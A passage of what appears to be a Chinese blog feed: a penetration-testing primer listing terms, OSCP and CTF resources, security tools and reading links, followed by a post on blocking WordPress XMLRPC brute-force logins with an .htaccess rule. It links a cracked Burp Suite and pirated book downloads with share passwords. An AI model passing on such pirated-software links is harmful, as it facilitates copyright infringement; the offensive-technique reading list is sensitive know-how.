href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project">《2017 Top 10 应用风险评估报告》</a><br>其目的是协助个人、企业和机构来发现和使用可信赖软件</td></tr><tr><td align="center">SCAP</td><td align="center">Security Content Automation Protocol</td><td align="center">安全内容自动化协议<br>已成立了<a href="http://www.scap.org.cn/">SCAP中文社区</a>，集成了协议框架中的CVE、CCE、<br>CPE、CWE、CVSS、OVAL等6种网络安全相关标准数据库</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities and Exposures</td><td align="center">公共漏洞与暴露<br>每个CVE都有唯一编号，是一个漏洞字典表</td></tr><tr><td align="center">EXP</td><td align="center">Exploit</td><td align="center">安全术语，指可利用点（如漏洞、代码等）</td></tr><tr><td align="center">vul</td><td align="center">Vulnerabilities</td><td align="center">安全术语，泛指漏洞</td></tr><tr><td align="center">PoC</td><td align="center">Proof of Concept</td><td align="center">漏洞的概念证明，常见是一段可复盘漏洞的代码</td></tr><tr><td align="center">payload</td><td align="center">-</td><td align="center">安全术语，有效载荷，泛指漏洞利用成功后所要做的事情<br>（如Cracker会做一些有害的或者恶性的动作）</td></tr><tr><td align="center">shellcode</td><td align="center">-</td><td align="center">安全术语，payload的一种，让攻击者获得 shell<br>（由于其建立正向/反向shell而得名）</td></tr><tr><td align="center">WAF</td><td align="center">Web Application Firewall</td><td align="center">Web应用防护系统（也称为：网站应用级入侵防御系统）</td></tr><tr><td align="center">Fuzz</td><td align="center">Fuzz testing</td><td align="center">模糊测试，一种安全测试方法<br>它介于完全的手工测试和完全的自动化测试之间<br>而手工测试是指渗透测试，即模拟Cracker进入系统查找漏洞</td></tr><tr><td align="center">社工</td><td align="center">社会工程学攻击</td><td align="center">安全术语，泛指通过心理战术，欺诈他人<br>以收集信息、行骗和入侵计算机系统的行为</td></tr><tr><td align="center">XSS</td><td align="center">Cross Site Scripting</td><td align="center">跨站脚本攻击（缩写首字母为X是为了不与CSS混淆）<br>根据攻击特点分为：反射型XSS、存储型XSS、DOM-XSS</td></tr><tr><td align="center">DoS</td><td align="center">Denial of Service</td><td align="center">拒绝服务攻击</td></tr><tr><td align="center">DDoS</td><td align="center">Distributed Denial of Service</td><td align="center">分布式拒绝服务攻击</td></tr><tr><td align="center">SQLi</td><td align="center">SQL Inject</td><td align="center">SQL注入式攻击</td></tr><tr><td align="center">CSRF</td><td align="center">Cross-site request forgery</td><td align="center">跨站请求伪造攻击</td></tr><tr><td align="center">CORS</td><td align="center">Cross-Origin Resource Sharing</td><td align="center">跨源资源共享</td></tr><tr><td align="center"><a href="https://gdpr-info.eu/">GDPR</a></td><td align="center">General Data Protection Regulation</td><td align="center">通用数据保护条例，在2018-5-25由欧盟正式出台<br>该条例的适用范围极为广泛，任何收集、传输、保留<br>或处理涉及到欧盟所有成员国内的个人信息的机构组织<br>均受该条例的约束，号称<a href="http://zhuanlan.51cto.com/art/201801/563326.htm">史上最严个人数据保护条例</a></td></tr></tbody></table><blockquote><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 <code>PoC</code>，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了他家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 <code>Exp</code>，你在他家所做的行为就是不同的 <code>Payload</code>，就把窃听器当作 <code>Shellcode</code> 吧！</p></blockquote><h2 id="Pwk课程与OSCP证书"><a href="#Pwk课程与OSCP证书" class="headerlink" title="Pwk课程与OSCP证书"></a>Pwk课程与OSCP证书</h2><p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/"><strong>OSCP认证</strong></a>：是一个专门针对 <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/"><strong>PwK课程</strong></a> 的国际安全专业认证。该认证机构声称，OSCP认证是一个区别于所有其它认证的考试，考试全程采取手动操作实战的方式，而不设笔试环节。这是在安全领域含金量非常高的国际认证。</p><p><strong>认证条件</strong>：无</p><p><strong>考试模式</strong>：OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。基于难度级别，成功执行的攻击会获得相应的积分。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。</p><p><strong>考试费用</strong>：最低 $ 800 （30天实验室访问学习 + 考试认证）</p><p><strong>相关链接</strong>：</p><ul><li><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP概述</a> </li><li><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK培训材料</a> </li></ul><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>Capture The Flag，夺旗赛。</p><p>通过在线靶场进行实战，磨炼网络安全技巧的一种竞技。这里推荐几个免费的 CTF 站点：</p><ul><li><a href="https://www.root-me.org/?lang=en">Root Me</a></li><li><a href="https://cgctf.nuptsast.com/challenges#Web">CG-CTF</a></li><li><a href="https://github.com/vulhub/vulhub">Vulhub</a></li></ul><p>不建议找答案，勇敢地刷题吧！ 可以很好地锻炼发掘EXP的能（nao）力（dong）~</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table><thead><tr><th align="center">工具</th><th align="center">简介</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Kali-Linux</td><td align="center">渗透测试的必备工具包<br>Kali是一个基于 Debian 的 Linux 发行版，专门用于渗透测试的工具系统<br>大多数做安全测试的渗透和审计开源工具都被尽可能多地囊括在内</td><td align="center"><a href="https://www.kali.org/downloads/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">CVEList</td><td align="center">CVE字典表</td><td align="center"><a href="https://github.com/CVEProject/cvelist" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">SecLists</td><td align="center">OWASP维护的一个安全信息列表集合<br>该集合包括了用于渗透的各种类型的列表，<br>这些列表包含了237个字典文件以及常用的 Web Shell 攻击载荷，<br>字典文件类型众多，如用户名、密码、域名、敏感数据特征码、模糊测试载荷等</td><td align="center"><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Exploit Database</td><td align="center">可利用漏洞数据库（在线）<br>罗列了最新被发现的CVE和PoC等信息，可用于学习漏洞原理和复盘</td><td align="center"><a href="https://www.exploit-db.com/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SearchSploit</td><td align="center">与 Exploit Database 配套的命令行工具包（已集成到Kali）<br>它把Exploit Database的数据保存在本地机器（攻击方），<br>通过搜集目标机器（防御方）的信息，在本地发现这些信息的EXP，<br>然后在本地机器提取对应的PoC上传到目标机器实现渗透</td><td align="center"><a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">Hydra</td><td align="center">弱密码爆破工具（已集成到Kali）</td><td align="center"><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Burp Suite</td><td align="center">用于攻击web 应用程序的集成平台（谁用谁知道）</td><td align="center"><a href="https://portswigger.net/burp" target="_blank" rel="nofollow">官网</a><br><a href="https://share.weiyun.com/5LDUkNW" target="_blank" rel="nofollow">破解版</a><br>密：gsqygf</td></tr><tr><td align="center">Arachni</td><td align="center">基于Ruby的Web漏洞扫描工具<br>算不上强大但有其特色，用于评估web应用程序的安全性<br>不仅能对基本的静态或CMS网站进行扫描，<br>还能识别大部分平台的指纹信息（硬盘序列号和网卡物理地址）</td><td align="center"><a href="http://www.arachni-scanner.com/" target="_blank" rel="nofollow">官网</a><br><a href="https://github.com/Arachni/arachni" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XSStrike</td><td align="center">基于python的XSS漏洞扫描和利用工具<br>它对参数进行模糊测试之后构建合适的payload，<br>然后对参数进行穷举匹配，大多数payload都是由作者精心构造。<br>其内置爬虫功能，能够检测并尝试绕过WAF，且误报率极低</td><td align="center"><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">XssPy</td><td align="center">基于python的Web应用XSS漏洞智能扫描器<br>它不仅能检查主页或给定页面，还能够检查网站上的所有链接以及子域<br>微软、斯坦福、摩托罗拉、Informatica等很多大型企业机构都在用</td><td align="center"><a href="https://github.com/faizann24/XssPy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Wfuzz</td><td align="center">Web Fuzzer：Web应用程序评估审查工具<br>它可以对任何字段的HTTP请求中的数据进行模糊处理</td><td align="center"><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">OpenSCAP</td><td align="center">基于C/C++实现的SCAP协议开源框架<br>目的是为SCAP各个标准协议的使用者提供一套简单易用的接口</td><td align="center"><a href="http://www.open-scap.org/" target="_blank" rel="nofollow">官网</a><br><a href="http://www.scap.org.cn/" target="_blank" rel="nofollow">中文社区</a><br><a href="https://github.com/OpenSCAP/openscap" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Hackvertor</td><td align="center">黑客工具包<br>看看黑客们平时都在用什么工具</td><td align="center"><a href="https://hackvertor.co.uk/public" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SSL/TLS安全评估报告</td><td align="center">检查HTTPS网站的SSL证书安全性</td><td align="center"><a href="https://myssl.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">SecurityHeaders</td><td align="center">通过分析HTTP响应头，评估相关安全选项是否配置得当<br>可根据评估建议修改配置</td><td align="center"><a href="https://securityheaders.com/" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">URL Fuzzer</td><td align="center">扫描Web服务器上的隐藏文件/目录是否存在敏感信息</td><td align="center"><a href="https://pentest-tools.com/website-vulnerability-scanning/discover-hidden-directories-and-files" target="_blank" rel="nofollow">在线检查</a></td></tr><tr><td align="center">MD5Online</td><td align="center">MD5解密：通过已知的Hash字典逆向爆破<br>（论MD5加salt的重要性）</td><td align="center"><a href="https://www.md5online.org/" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">truffleHog</td><td align="center">排查 Git 项目中是否包含可疑的敏感信息</td><td align="center"><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">BFG Repo-Cleaner</td><td align="center">移除 Git 库中的大文件或污点提交</td><td align="center"><a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="nofollow">官网</a><br><a href="https://help.github.com/articles/removing-sensitive-data-from-a-repository/" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">brakeman</td><td align="center">通过静态代码扫描发现代码里的SQL注入问题</td><td align="center"><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">gixy</td><td align="center">Nginx 配置文件静态分析器<br>防止安全配置错误，并自动进行缺陷检测</td><td align="center"><a href="https://github.com/yandex/gixy" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">bleach</td><td align="center">HTML净化器<br>对HTML片段进行标签或属性过滤，预防XSS攻击</td><td align="center"><a href="https://github.com/ecto/bleach" target="_blank" rel="nofollow">Github</a><br><a href="https://pypi.org/project/bleach/" target="_blank" rel="nofollow">Python版</a><br><a href="http://htmlpurifier.org/" target="_blank" rel="nofollow">PHP版</a></td></tr><tr><td align="center">New PHP Snippet</td><td align="center">PHP在线运行环境</td><td align="center"><a href="https://glot.io/new/php" target="_blank" rel="nofollow">在线使用</a></td></tr><tr><td align="center">RequestBin</td><td align="center">临时 HTTP 服务器，用于收集 HTTP 请求，XSS 利器</td><td align="center"><a href="https://requestbin.fullcontact.com/" target="_blank" rel="nofollow">在线使用</a></td></tr></tbody></table><hr><h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><table><thead><tr><th align="center">参考书（Kali系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Penetration Testing with Kali Linux (pwk.1.0)</td><td align="center">Kali-Linux渗透测试学习指南<br>PwK官方文档v1.0.1 - 2014版</td><td align="center"><a href="https://share.weiyun.com/5Z23CiY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4vi4bw</td></tr><tr><td align="center">Instant Kali Linux</td><td align="center">2013<br>Kali快速入门指导</td><td align="center"><a href="https://share.weiyun.com/5ar7k9m" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ryxi47</td></tr><tr><td align="center">Basic Security Testing with Kali Linux</td><td align="center">2014<br>基于Kali的安全测试</td><td align="center"><a href="https://share.weiyun.com/5PrItbo" target="_blank" rel="nofollow">腾讯微云</a><br>密码：qw9ym8</td></tr><tr><td align="center">Hacking with Kali - <br>Practical Penetration Testing Techniques</td><td align="center">2014<br>渗透测试实践技术</td><td align="center"><a href="https://share.weiyun.com/55GnaFY" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xk8a3z</td></tr><tr><td align="center">Kali Linux Cookbook</td><td align="center">2013<br>Kali指导手册</td><td align="center"><a href="https://share.weiyun.com/5sAQ8mB" target="_blank" rel="nofollow">腾讯微云</a><br>密码：xhgjcd</td></tr><tr><td align="center">Kali Linux Social Engineering</td><td align="center">2013<br>基于Kali的社会工程</td><td align="center"><a href="https://share.weiyun.com/5eT0MG3" target="_blank" rel="nofollow">腾讯微云</a><br>密码：gs4xay</td></tr><tr><td align="center">Kali Linux：Assuring Security By Penetration Testing</td><td align="center">2014<br>通过渗透测试确保安全</td><td align="center"><a href="https://share.weiyun.com/5A6P3Ak" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6nrp2k</td></tr><tr><td align="center">Web Penetration Testing with Kali Linux</td><td align="center">2013<br>web应用渗透测试</td><td align="center"><a href="https://share.weiyun.com/5zhW9me" target="_blank" rel="nofollow">腾讯微云</a><br>密码：2cxp9c</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（Metasploit系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Metasploit渗透测试魔鬼训练营</td><td align="center">2013.国内中文原创<br>详细讲解了Metasploit渗透测试的<br>技术、方法和技巧，并提供实战的实验室环境</td><td align="center"><a href="https://share.weiyun.com/5zAbIeM" target="_blank" rel="nofollow">腾讯微云</a><br>密码：i9ihtu</td></tr><tr><td align="center">Metasploit The Penetration Tester's Guide</td><td align="center">2011<br>渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5bl1xRV" target="_blank" rel="nofollow">腾讯微云</a><br>密码：6gurxk</td></tr><tr><td align="center">Metasploit Penetration Testing Cookbook</td><td align="center">Jun.2012<br>渗透测试指导手册</td><td align="center"><a href="https://share.weiyun.com/5KfMxPQ" target="_blank" rel="nofollow">腾讯微云</a><br>密码：r4q73x</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（BackTrack5系列）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Offensive Security - <br>Penetration Testing with BackTrack (Lab Guide)</td><td align="center">v3.2<br>渗透测试实验室指导手册</td><td align="center"><a href="https://share.weiyun.com/5XzmA5I" target="_blank" rel="nofollow">腾讯微云</a><br>密码：fj9sqt</td></tr><tr><td align="center">BackTrack 5 Wireless Penetration Testing Beginner's Guide</td><td align="center">无线网络渗透测试入门指导</td><td align="center"><a href="https://share.weiyun.com/5Ql8le1" target="_blank" rel="nofollow">腾讯微云</a><br>密码：pdeqfn</td></tr></tbody></table><br><table><thead><tr><th align="center">参考书（其他）</th><th align="center">简介/版本</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">影响力（中文版）</td><td align="center">社会工程学<br>人为什么犯贱？</td><td align="center"><a href="https://share.weiyun.com/5mcRzVn" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ssyf25</td></tr><tr><td align="center">欺骗的艺术（中文版）</td><td align="center">社会工程学<br>世界著名黑客传奇</td><td align="center"><a href="https://share.weiyun.com/5s0Wwqr" target="_blank" rel="nofollow">腾讯微云</a><br>密码：wtpih9</td></tr><tr><td align="center">Learning Nessus for Penetration Testing</td><td align="center">Jan.2014<br>基于Nessus的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5F4iVQ7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：dak9um</td></tr><tr><td align="center">PP.Penetration Testing with the Bash shell</td><td align="center">May.2014<br>基于Bash的渗透测试</td><td align="center"><a href="https://share.weiyun.com/59Ltlbj" target="_blank" rel="nofollow">腾讯微云</a><br>密码：7saehu</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">2011<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/50E2OGL" target="_blank" rel="nofollow">腾讯微云</a><br>密码：z9enyr</td></tr><tr><td align="center">The Basics of Hacking and Penetration Testing<br>( Ethical Hacking and Penetration Testing Made Easy )</td><td align="center">The 2nd Edition, 2013<br>渗透测试的基本理论</td><td align="center"><a href="https://share.weiyun.com/5PKAJAU" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5nwjt3</td></tr><tr><td align="center">Advanced Penetration Testing For Highly-Secured <br>Environments The Ultimate Security Guide</td><td align="center">2012<br>终极指南：高安全环境的渗透测试</td><td align="center"><a href="https://share.weiyun.com/5VoihK7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：3u3c9t</td></tr><tr><td align="center">Gray Hat Hacking</td><td align="center">The 2nd Edition<br>灰帽子黑客</td><td align="center"><a href="https://share.weiyun.com/5EwizdA" target="_blank" rel="nofollow">腾讯微云</a><br>密码：4tvjgb</td></tr><tr><td align="center">Hacking - Firewalls And Networks <br>How To Hack Into Remote Computers</td><td align="center">防火墙突破：远程网络渗透</td><td align="center"><a href="https://share.weiyun.com/5CAc1BG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：k93xfx</td></tr><tr><td align="center">Hacking The Art Of Exploitation</td><td align="center">The 2nd Edition, 2018<br>漏洞利用的艺术</td><td align="center"><a href="https://share.weiyun.com/5FDCNeP" target="_blank" rel="nofollow">腾讯微云</a><br>密码：5c5ee6</td></tr><tr><td align="center">Hacking Wireless Networks For Dummies</td><td align="center">2005<br>无线网络窃听</td><td align="center"><a href="https://share.weiyun.com/5f7y3QF" target="_blank" rel="nofollow">腾讯微云</a><br>密码：px7hgj</td></tr><tr><td align="center">Penetration Testing A Hands-On Introduction to Hacking</td><td align="center">2014<br>渗透测试实践指导</td><td align="center"><a href="https://share.weiyun.com/5Wbiij7" target="_blank" rel="nofollow">腾讯微云</a><br>密码：996jfr</td></tr><tr><td align="center">Practical Hacking - Techniques and Countermeasures</td><td align="center">黑客实践的技术与对策</td><td align="center"><a href="https://share.weiyun.com/5ON5FQG" target="_blank" rel="nofollow">腾讯微云</a><br>密码：ne75b9</td></tr></tbody></table><hr><h2 id="相关文献推荐"><a href="#相关文献推荐" class="headerlink" title="相关文献推荐"></a>相关文献推荐</h2><p><strong>社会工程：</strong></p><ul><li>信息安全之社会工程学（<strong>需梯子</strong>）：<a href="https://program-think.blogspot.com/2009/05/social-engineering-0-overview.html">常识扫盲</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-1-gather-information.html">信息收集</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-2-pretend.html">假冒身份</a>、<a href="https://program-think.blogspot.com/2009/05/social-engineering-3-influence.html">施加影响</a></li><li><a href="https://blog.csdn.net/pongba/article/details/1662148">《影响力》——人为什么犯贱</a></li><li><a href="https://www.zhihu.com/question/26113526">有哪些「社会工程学」攻击手段？</a></li><li><a href="https://guanjia.qq.com/news/n4/201505/12_18.html">防范社会工程学攻击的技巧与姿势</a></li></ul><p><strong>场景案例：</strong></p><ul><li><a href="https://www.douban.com/note/624958066/">Penetration Testing with Kali (PWK) 课程和 Offensive Security Certified Professional (OSCP) 考试回顾</a></li><li><a href="https://zhuanlan.zhihu.com/p/24249045">XSS实战：我是如何拿下你的百度账号</a></li><li><a href="http://www.kali.org.cn/thread-27331-1-1.html?tdsourcetag=s_pcqq_aiomsg">如何构建自己的渗透测试环境</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/107">驱散前端安全梦魇——DOMXSS典型场景分析与修复指南</a></li><li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html">CSRF 攻击的应对之道</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html">DDOS 攻击的防范教程</a></li><li><a href="https://www.freebuf.com/column/138074.html">海量日志中，如何实时在线检测未知异常行为？看瀚思的序列异常算法</a></li><li><a href="https://xz.aliyun.com/t/2860">记一次在实战靶机中使用SearchSploit的总结</a></li><li><a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">Paypal 2FA Bypass（通过删掉HTTP请求参数绕过验证）</a></li><li><a href="http://www.antiy.com/response/Upatre.html">部分利用社工技巧的群发邮件样本关联分析</a></li></ul><p><strong>主机入侵：</strong></p><ul><li><a href="https://www.qa-knowhow.com/?p=4688">主机威胁入侵检测开源工具与规则</a></li><li><a href="https://blog.csdn.net/AlexTan_/article/details/52080171">OSSEC主要功能及原理+详细配置+日志文件分析</a></li><li><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-elk/index.html">集中式日志系统 ELK 协议栈详解</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/21">浅谈大型网络入侵检测建设</a></li></ul><p><strong>Linux提权：</strong></p><ul><li><a href="https://payatu.com/guide-linux-privilege-escalation/">A GUIDE TO LINUX PRIVILEGE ESCALATION</a></li><li><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/">Linux提权基础介绍</a>（是前一篇的译文）</li><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></li><li><a href="https://www.freebuf.com/articles/system/23993.html">史上最全Linux提权后获取敏感信息方法</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2512">初识linux提权</a></li><li><a href="http://www.4hou.com/technology/2422.html">渗透测试中的Linux提权</a></li><li><a href="https://www.freebuf.com/sectool/121847.html">Linux提权？这四个脚本可以帮助你</a></li><li><a href="https://www.freebuf.com/articles/system/129549.html">Linux提权：从入门到放弃</a></li></ul><p><strong>Windows提权：</strong></p><ul><li><a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a></li><li>Windows下的渗透测试之提权的基本套路<a href="https://www.anquanke.com/post/id/84852">[上]</a><a href="https://www.anquanke.com/post/id/84855">[下]</a>（是前一篇的译文）</li><li><a href="https://xz.aliyun.com/t/2519">Windows提权笔记</a></li><li><a href="https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html">Privilege Escalation Windows</a></li><li><a href="http://www.4hou.com/system/10212.html">Windows 提权命令指南</a></li><li><a href="https://www.freebuf.com/vuls/87463.html">Windows提权的几种姿势</a></li><li><a href="http://www.secist.com/archives/1070.html">内网渗透之如何玩转Meterpreter？</a></li><li><a href="https://www.freebuf.com/articles/system/184289.html">Windows内核漏洞利用提权教程</a></li><li><a href="https://xz.aliyun.com/t/203">Metasploit、Powershell之AlwaysInstallElevated提权实战</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-2227.html">metasploit 渗透测试笔记(meterpreter篇)</a></li></ul><p><strong>WebShell：</strong></p><ul><li><a href="https://www.jianshu.com/p/02aac12e459f">webshell原理</a></li><li><a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/">bash反弹shell原理解析</a></li><li><a href="https://www.wxwenku.com/d/244863">基于机器学习的web异常检测</a></li><li><a href="https://www.freebuf.com/articles/rookie/190953.html">机器学习入门之像使用Print一样使用算法检测WebShell</a></li><li><a href="https://sec.ctrip.com/doc/%E6%B6%82%E5%AE%8F%E4%BC%9F-OSSEC%E4%B8%8Ewebshell%E7%9B%91%E6%8E%A7%E6%8E%A2%E7%B4%A2.pdf">OSSEC与webshell实时监控探索</a></li></ul><p><strong>HTTP相关：</strong></p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies</a></li><li><a href="https://github.com/jin5354/404forest/issues/54">HTTP 安全最佳实践</a></li><li><a href="http://cizixs.com/2016/12/12/restful-api-design-guide/">跟着 Github 学习 Restful HTTP API 设计</a></li></ul><p><strong>其他：</strong></p><ul><li><a href="https://wizardforcel.gitbooks.io/mst-sec-lecture-notes/content/">米斯特白帽培训讲义</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">知道创宇研发技能表v3.1</a></li><li><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/index.html">大学霸 Kali Linux 安全渗透教程</a></li><li><a href="https://www.freebuf.com/articles/database/68877.html">大数据安全分析漫谈</a></li><li><a href="https://www.freebuf.com/articles/network/124422.html">浅析ReDoS的原理与实践</a></li><li><a href="https://www.freebuf.com/articles/web/155209.html">最好用的开源Web漏扫工具梳理</a></li><li><a href="https://itextpdf.com/blog/how-completely-remove-file-git-repository">How to completely remove a file from a Git repository</a></li><li><a href="http://mannix.top/2018/11/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/">渗透测试常用工具集合</a></li></ul><hr><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="https://share.weiyun.com/5eRmvxa">腾讯微云（密码：mpgksn）</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 白帽子 </tag>
            
            <tag> Pwk </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录</title>
      <link href="/website/jin-yong-xmlrpc-bi-mian-ddos/"/>
      <url>/website/jin-yong-xmlrpc-bi-mian-ddos/</url>
      
        <content type="html"><![CDATA[<h2 id="诱因"><a href="#诱因" class="headerlink" title="诱因"></a>诱因</h2><p>自从使用 Wordpress 建站以来，就一直被机器人暴力爆破登录密码，其规模已经足以引起DDos攻击，导致服务器启动没多久，资源就被耗尽，打开极其缓慢。</p><p>即使安装 Limit Login Attempts 插件进行登录限制，依然会被机器人用 IP 池持续攻击，成效甚微：</p><p><img src="./01.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从 Limit Login Attempts 插件的限制日志可以发现， 通过 XMLRPC 登录的次数远远大于通过 WP Login 登录的次数。</p><p>WP Login 就是通过 http://${site-url}/wp-login.php 直接登录， Limit Login Attempts 插件会加上校验码，使其不容易被爆破。</p><p>而 XMLRPC 的全称是 XML Remote Procedure Call，即 XML远程方法调用。它是 XHR （即 XMLHttpRequest）的一种实现，其交互消息都是基于 HTTP-POST 请求，请求的内容是 XML，服务端的返回结果同样也是 XML。</p><p>对于爬虫机器人而言，相对于 WP Login 方式，使用 XMLRPC 会更方便。因为前者更接近仿真方式登录，而后者则是纯脚本交互，而且可以绕过 Limit Login Attempts 等插件对登录页面的保护。</p><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><p>知道根源，处理就很简单了。因为作为站长，一般是用不到 XMLRPC 去管理自己站点的，所以禁用它即可。</p><p>而禁用的方法有很多，最简单直接的方法，就是修改网站后台根目录的 <code>.htaccess</code> 文件，在末尾加上这段内容即可：</p><pre class="line-numbers language-xml"><code class="language-xml"># forbit xmlrpc.php request (crawler, ddos, ...)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Files</span> <span class="token attr-name">xmlrpc.php</span><span class="token punctuation">></span></span>order deny,allowdeny from all<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Files</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> XMLRPC </tag>
            
            <tag> DDOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WINDOWS 内核学习顺序指引清单</title>
      <link href="/re/windows-nei-he-xue-xi-qing-dan/"/>
      <url>/re/windows-nei-he-xue-xi-qing-dan/</url>
      
